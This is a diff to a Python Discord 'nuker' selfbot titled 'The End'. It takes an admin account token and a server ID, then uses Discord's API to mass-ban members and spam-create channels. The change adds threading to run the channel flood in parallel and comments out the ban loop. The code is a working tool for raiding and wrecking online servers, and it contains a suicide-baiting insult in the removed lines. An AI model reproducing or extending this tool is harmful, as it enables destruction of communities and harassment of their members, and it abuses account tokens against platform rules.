@@ -5,14 +5,18 @@ init(convert=True)
 import requests
 import os
 import time
+import threading
 
 red = Fore.RED + Style.BRIGHT
 green = Fore.GREEN + Style.BRIGHT
 blue = Fore.BLUE + Style.BRIGHT
 white = Fore.WHITE
 
+threads = []
+num_threads = 10
+
 def main():
-    os.system("cls && title The End ┃┃ @swedewtsf @rinfysbanned")
+    os.system("cls && title The End ┃^┃ @swedewtf @rinfysbanned")
     print(fr"""{red}                                           
 
     ████████╗██╗░░██╗███████╗  ███████╗███╗░░██╗██████╗░
@@ -26,30 +30,36 @@ def main():
     """)
     choice = str(input(f"{white}[{red}END{white}] Choice >>> "))
     if choice in ["01", "1", "one"]:
-        selfbot.spamchannels()
+        for x in range(num_threads):
+            t = threading.Thread(target=selfbot.spamchannels)
+            t.start()
+            threads.append(t)   
+
+    for t in threads:
+        t.join()
     if choice in ["02", "2", "two"]:
         selfbot.banall(token)
 
 class selfbot:
-    def __init__(self):
-        bannedamount = []
-    def banall():
+    def banall(token):
         headers = {
             "Authorization": token,
             "Content-Type": "application/json",
         }
-        members = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members/", headers=headers).json()
+        members = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members-search", headers=headers).json()
         print(members)
-        while True:
-            for member in members:
-                banreq = requests.put(f"https://discord.com/api/v9/guilds/{guildid}/bans/{member}", headers={"Authorization": token})
-                if banreq.status_code in [200, 201, 204]:
-                    print(f"{green} [+] Banned {member}")
-                elif "retry_after" in banreq.text:
-                    time.sleep(banreq.json()['retry_after'])
-                else:
-                    print(f"{red}{banreq.text}")
-                    break
+#        while True:
+#            for member in members:
+#                banreq = requests.put(f"https://discord.com/api/v9/guilds/{guildid}/bans/{member}", headers={"Authorization": token})
+#                if banreq.status_code in [200, 201, 204]:
+#                    print(f"{green} [+] Banned {member}")
+#                    with open("bannedmembers.txt", "a") as bannedamount:
+#                       bannedamount.append(member)
+#                elif "retry_after" in banreq.text:
+#                    time.sleep(banreq.json()['retry_after'])
+#                else:
+#                    print(f"{red}{banreq.text}")
+#                    break
 
     def spamchannels():
         yes = input(f"{white}[{red}END{white}] Are you sure? (Y or N)")
@@ -81,9 +91,7 @@ class selfbot:
                             while spam.status_code<201:
                                 spam = requests.post(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers=headers, json=real)
                                 print(f"{green}[+] Trying to create")
-        else:
-            print("ok kys")
-            main()
+        print("Banning")
 
 guildid = input(f"{white}[{red}END{white}] Server ID: ")
 token = input(f"{white}[{red}END{white}] Enter selfbot token (must have admin in server): ")
